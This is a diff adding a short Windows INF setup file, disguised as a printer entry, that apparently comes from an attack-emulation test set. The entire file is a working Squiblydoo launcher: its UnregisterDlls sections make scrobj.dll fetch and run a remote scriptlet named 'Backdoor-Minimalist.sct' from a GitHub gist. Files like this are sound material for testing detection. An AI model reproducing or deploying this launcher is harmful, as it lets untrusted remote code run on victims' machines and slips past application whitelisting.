@@ -1,0 +1,31 @@
+; ----------------------------------------------------------------------
+; Required Sections
+; ----------------------------------------------------------------------
+[Version] 
+Signature=$CHICAGO$
+Provider=test
+Class=Printer
+
+[Manufacturer]
+HuntressLabs=ModelsSection,NTx86,NTia64,NTamd64
+
+; ----------------------------------------------------------------------
+; Models Section
+; ----------------------------------------------------------------------
+[ModelsSection.NTx86]
+UnregisterDlls = Squiblydoo
+
+[ModelsSection.NTia64]
+UnregisterDlls = Squiblydoo
+
+[ModelsSection.NTamd64]
+UnregisterDlls = Squiblydoo
+
+; ----------------------------------------------------------------------
+; Support Sections
+; ----------------------------------------------------------------------
+[DefaultInstall]
+UnregisterDlls = Squiblydoo
+
+[Squiblydoo]
+11,,scrobj.dll,2,60,https://gist.githubusercontent.com/subTee/24c7d8e1ff0f5602092f58cbb3f7d302/raw/ef22366bfb62a2ddea8c5e321d3ce2f4c95d2a66/Backdoor-Minimalist.sct
